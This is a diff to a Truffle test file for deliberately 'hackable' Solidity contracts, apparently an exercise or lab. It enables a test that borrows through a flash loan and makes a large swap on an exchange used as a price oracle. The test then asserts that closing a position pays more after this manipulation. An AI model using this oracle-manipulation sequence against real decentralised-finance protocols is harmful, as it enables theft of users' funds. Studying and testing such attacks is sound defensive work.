@@ -1,6 +1,6 @@
 const TrojanCoinAfter = artifacts.require("TrojanCoinAfter");
 const HackableExchange1After = artifacts.require("HackableExchange1After");
-//const HackableExchange2After = artifacts.require("HackableExchange2After");
+const HackableExchange2After = artifacts.require("HackableExchange2After");
 const FlashLoanProvider1After = artifacts.require("FlashLoanProvider1After");
 
 
@@ -92,19 +92,36 @@ contract("FlashLoanProvider1After", async accounts => {
 });
 
 
-/*
+
 
 contract("HackableExchange2After", async accounts => {
   it("Should allow you to open a large BTCETH position and get price information from the hackable exchange. And let you close your position based on information from that exchange.", async () => {
 
 
-   coin = await HackableExchange1After.deployed();
+   theContract = await HackableExchange2After.deployed();
+   flashPlatformWithDaiCoin = await FlashLoanProvider1After.deployed();
+   fromToken = await TrojanCoinAfter.deployed();
+   oracleExchange = await HackableExchange1After.deployed();
 
 
-        assert.isUnder(pricebeforeJacking, priceAfterJacking, "You executed a reentry account but the exchange didnt give you extra money for it.")
+   await theContract.setOracleAddress(oracleExchange.address);
+   await theContract.createPosition(flashPlatformWithDaiCoin.address, fromToken.address, true, 2, 100000000);
+
+   await fromToken.updateSupply('10000000000000000000000001')
+   await fromToken.updateBalance('10000000000000000000000000')
+   await fromToken.transfer(flashPlatformWithDaiCoin.address, '1000000000000000000000000')
+   amountWithoutJacking = parseInt(await theContract.closePosition.call());
+
+   flashPlatformWithDaiCoin.borrowToken(fromToken.address, '1000000000000000000000000');
+   await oracleExchange.tokenToTokenSwap(fromToken.address, flashPlatformWithDaiCoin.address, '100000000000000000000001');
+
+   amountClosed = parseInt(await theContract.closePosition.call());
+   theContract.closePosition;
+
+   console.log( "with jacking" + amountClosed);
+   console.log( "without jacking" + amountWithoutJacking);
+        assert.isAbove(amountClosed, amountWithoutJacking, "Oracle manipulation didnt happen or trade previous to closing position want high enough to change the oracle rate")
 
 
  })
 });
-
-*/
